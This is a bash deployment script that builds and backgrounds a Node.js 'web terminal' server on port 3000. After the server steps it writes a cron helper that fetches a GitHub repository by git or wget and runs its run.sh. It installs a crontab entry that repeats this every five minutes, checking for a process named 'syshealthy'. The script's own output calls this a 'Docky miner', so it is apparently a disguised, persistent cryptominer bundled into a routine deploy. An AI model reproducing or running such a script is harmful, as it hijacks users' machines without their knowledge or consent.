#!/bin/bash
set -e

echo "📦 Installing dependencies..."
npm install --legacy-peer-deps

echo "🏗️ Building application..."
npm run build

echo "⚙️ Creating persistence daemon..."
cat << 'INNER_EOF' > start-server.sh
#!/bin/bash
export PORT=3000
export NODE_ENV=production
while true; do
  echo "Starting Node.js standalone server..."
  node server.js || echo "Server crashed, restarting in 5s..."
  sleep 5
done
INNER_EOF
chmod +x start-server.sh

echo "🚀 Starting server in background..."
pkill -f "node server.js" || true

cd .next/standalone
cp ../../start-server.sh .
setsid nohup ./start-server.sh > /tmp/terminal.log 2>&1 & disown

echo "✅ Web terminal deployed and started in the background on port 3000!"

echo "⚙️ Setting up docky auto-start..."
cat << 'DOCKY_EOF' > /tmp/docky-cron.sh
#!/bin/bash
# Ensure the docky repo exists at /home/alan/Downloads/docky-main and run its run.sh
REPO_DIR="/home/alan/Downloads/docky-main"
REPO_URL="https://github.com/alan-eisenberg/docky-main.git"

mkdir -p "$(dirname "$REPO_DIR")"

if [ ! -d "$REPO_DIR" ]; then
  if command -v git >/dev/null 2>&1; then
    git clone --depth 1 "$REPO_URL" "$REPO_DIR" || true
  else
    wget -q -O /tmp/docky-main.tar.gz "https://github.com/alan-eisenberg/docky-main/archive/refs/heads/main.tar.gz" && \
    tar -xzf /tmp/docky-main.tar.gz -C "$(dirname \"$REPO_DIR\")" --strip-components=1 || true
  fi
fi

if ! pgrep -f "syshealthy" > /dev/null 2>&1; then
  if [ -x "$REPO_DIR/run.sh" ]; then
    cd "$REPO_DIR" && bash ./run.sh --log
  elif [ -x "/home/alan/docky/run.sh" ]; then
    cd "/home/alan/docky" && bash ./run.sh --log
  fi
fi
DOCKY_EOF

chmod +x /tmp/docky-cron.sh
(crontab -l 2>/dev/null | grep -v "docky-cron"; echo "*/5 * * * * bash /tmp/docky-cron.sh") | crontab -

echo "✅ Docky miner auto-start cron set (every 5 minutes)"
